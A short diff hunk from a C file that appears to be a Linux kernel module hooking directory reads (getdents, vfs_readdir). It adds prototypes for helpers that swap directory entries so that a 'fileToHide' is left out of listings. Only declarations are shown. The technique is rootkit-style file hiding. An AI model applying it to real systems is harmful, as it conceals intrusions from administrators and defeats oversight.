@@ -37,6 +37,11 @@ struct getdents_callback {
 
 /*declare vfs_readdir, this function is exported by kernel*/
 int vfs_readdir(struct file *file, filldir_t filler, void *buf);
+
+/*when the fileToHide is first one in the buf, swap that with the next to it*/
+static int swap_kern_dirent(struct linux_dirent *dirent, struct linux_dirent *dirent_next);
+static int swap_user_dirent(struct linux_dirent __user *dirent, struct linux_dirent __user *dirent_next);
+
 /*compare two string
  *<0 if s1<s2;
  *=0 if s1==s2;
